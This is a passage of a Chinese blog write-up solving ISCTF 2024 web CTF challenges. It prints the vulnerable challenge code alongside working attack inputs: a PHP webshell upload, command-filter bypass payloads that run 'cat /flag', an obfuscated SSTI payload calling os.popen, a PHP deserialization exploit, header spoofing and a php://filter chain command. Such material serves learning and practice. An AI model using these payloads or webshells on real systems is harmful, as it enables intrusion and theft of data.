class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 1.php# 题目提示的写马</span><br><span class="language-xml"></span><br><span class="language-xml">······</span><br></code></pre></td></tr></table></figure><h2 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会"></a>25时晓山瑞希生日会</h2><p>bp抓包</p><p>1、“你不是烤p！要是Project Sekai的客户端请求才能加入生日会” &#x3D;&#x3D;&gt; 把ua头改为“Project Sekai”</p><p>2、“只能从本地来！” &#x3D;&#x3D;&gt; 加一个xff头“X-Forwarded-For: 127.0.0.1”</p><p>3、“你似乎没在正确的时间来…”</p><p>加一个Date头，先随便加一个时间，提示“日期格式不对哦，要RFC 822格式”</p><blockquote><p>RFC 822格式时间是一种标志化的时间表示方法，常用于电子邮件和互联网协议中，它的格式为：Day, DD Mon YYYY HH:MM:SS GMT，例如：Mon, 30 Nov 2020 01:07:30 GMT</p></blockquote><p>按照格式修改Date头的值，提示太早了</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/251.png"></p><p>检索一下“25时晓山瑞希生日会”，发现时间“2024年8月27日”，修改Date头，拿到flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/252.png"></p><h2 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader"></a>UP!UPloader</h2><p>先随便传一个文件，提示include.php</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/up1.png"></p><p>访问include.php，提示文件包含，尝试用伪协议读出upload.php</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</p></blockquote><p>解码后，得到upload.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_FILENAME);<br>    <span class="hljs-variable">$dir_name</span> = <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$upload_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$upload_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$upload_dir</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$dir_name</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$ext</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！不过文件路径可不好找呀~什么？什么include.php？我不知道啊。&quot;</span> ;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储失败，未知原因......&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传后被放在&#x2F;uploads目录下，且文件被保存为md5(原文件名.拓展名)+拓展名</p><p>上传1.php，其中写入一句话木马，上传后1.php被保存为f3b94e88bd1bd325af6f62828c8785dd.php，然后连马，拿flag，flag在环境变量中</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Blocked by security filter!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了一些命令和函数，直接贴一些payload吧</p><blockquote><p>cmd&#x3D;passthru(‘ca\t${IFS}&#x2F;f*’);</p><p>cmd&#x3D;passthru(‘strings${IFS}&#x2F;f*’);</p><p>cmd&#x3D;include$_GET[‘a’];&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag</p><p>cmd&#x3D;(sy.(st).em)(hex2bin(‘636174202f662a’));</p><p>······</p></blockquote><h2 id="ezSSTI"><a href="#ezSSTI" class="headerlink" title="ezSSTI"></a>ezSSTI</h2><p>fenjing一把梭</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/ezssti.png"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0062</span><span class="hljs-character">\u0075</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)|attr(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0076</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u006c</span>&#x27;)(<span class="hljs-name">&#x27;</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u005f</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u006f</span><span class="hljs-character">\u0070</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u006e</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0063</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u0020</span><span class="hljs-character">\u002f</span><span class="hljs-character">\u0066</span><span class="hljs-character">\u006c</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0067</span><span class="hljs-character">\u0022</span><span class="hljs-character">\u0029</span><span class="hljs-character">\u002e</span><span class="hljs-character">\u0072</span><span class="hljs-character">\u0065</span><span class="hljs-character">\u0061</span><span class="hljs-character">\u0064</span><span class="hljs-character">\u0028</span><span class="hljs-character">\u0029</span>&#x27;))%&#125;<br></code></pre></td></tr></table></figure><h2 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize"></a>ezserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;flag;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You can&#x27;t directly access the flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;isAdmin) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome, admin! Here&#x27;s your flag: &quot;</span> . (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>())-&gt;<span class="hljs-title function_ invoke__">getFlag</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$this</span>-&gt;username) . <span class="hljs-string">&quot;!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><br>    <span class="hljs-variable">$object</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> <span class="hljs-keyword">instanceof</span> User) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid object!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>反序列化触发User类中的__wakeup()魔术方法，打印出flag</p><p>序列化exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isAdmin</span> = True;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="千年樱"><a href="#千年樱" class="headerlink" title="千年樱"></a>千年樱</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;proof of work&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;from&#x27;</span>] === <span class="hljs-string">&quot;ISCTF&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what? so where are you from?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// &lt;!-- do you want to learn more?  goto story.txt --&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>添加一个cookie</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh1.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-string">&#x27;ISCTF&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>data伪协议写入</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh2.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dir.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|php|file|:|=|\/|\?/i&quot;</span>, <span class="hljs-variable">$str</span>) )&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$poc</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$poc</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/<span class="hljs-subst">$poc</span>/resource=/var/www/html/badChar.txt&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> === <span class="hljs-string">&quot;sakura for ISCTF&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes! master!&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>] == <span class="hljs-number">114514</span> &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;output&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里用php:&#x2F;&#x2F;filter链构造字符加strips_tags截断，然后rce拿flag</p><p>用php_filter_chain_generator构造filter链</p><blockquote><p>python php_filter_chain_generator.py –chain sakura for ISCTF&lt;?php</p></blockquote><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/qyh3.png"></p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.jpeg<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment"># 帮天命人搜集法宝，重获齐天之姿！</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Wuzhishan</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wu</span>=<span class="hljs-string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zhi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shan</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$j</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$yin</span>=<span class="hljs-string">&quot;s214587387a&quot;</span>;<br>        <span class="hljs-variable">$yang</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-variable">$yang</span>&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yin</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$yang</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Huoyanjinjing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huoyan</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jinjing</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$huo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;huoyan=<span class="hljs-string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;jinjing=<span class="hljs-string">&quot;金睛能看破世间迷惘！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;huoyan-&gt;jinjing;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dinghaishenzhen</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Jindou</span>=<span class="hljs-string">&quot;一个筋斗能翻十万八千里！&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yun</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$f</span>=<span class="hljs-variable language_">$this</span>-&gt;yun;<br>        <span class="hljs-variable">$f</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的逃出去了吗？天命人？&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jingdouyun</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Qishier</span>=<span class="hljs-number">72</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bian</span>=<span class="hljs-string">&quot;看俺老孙七十二变！&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;三更敲门，菩提老祖送我筋斗云...&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jindouyun</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tianmingren</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tianming</span>;<br>    <span class="hljs-keyword">public</span> <span 